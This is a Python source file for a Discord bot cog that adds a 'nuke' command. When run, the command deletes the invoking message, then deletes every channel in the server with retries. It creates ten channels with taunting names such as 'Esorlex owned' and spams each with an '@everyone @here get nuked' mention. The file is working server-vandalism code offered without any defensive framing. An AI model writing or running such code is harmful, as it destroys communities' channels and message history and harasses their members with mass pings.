import discord
from discord.ext import commands
import asyncio

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def nuke(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild

        await self.delete_all_channels(guild)

        names = ["Esorlex owned 🤑", "Skidded off sus 😍"]
        for i in range(10):
            try:
                name = names[i % len(names)]
                ch = await guild.create_text_channel(name)
                await self.spam_channel(ch)
            except Exception as e:
                print(f"Error creating/spamming channel: {e}")

    async def delete_all_channels(self, guild):
        to_delete = list(guild.channels)
        max_retries = 5

        for attempt in range(max_retries):
            failed = []
            delete_tasks = []

            for channel in to_delete:
                delete_tasks.append(self.try_delete(channel))

            results = await asyncio.gather(*delete_tasks)
            failed = [ch for ch, success in zip(to_delete, results) if not success]

            if not failed:
                break  
            to_delete = failed  

    async def try_delete(self, channel):
        try:
            await channel.delete()
            return True
        except (discord.HTTPException, discord.Forbidden) as e:
            print(f"Failed to delete {channel.name}: {e}")
            return False

    async def spam_channel(self, channel):
        try:
            await channel.send("@everyone @here get nuked 🤣")
        except Exception as e:
            print(f"Failed to spam {channel.name}: {e}")

async def setup(bot):
    await bot.add_cog(Nuke(bot))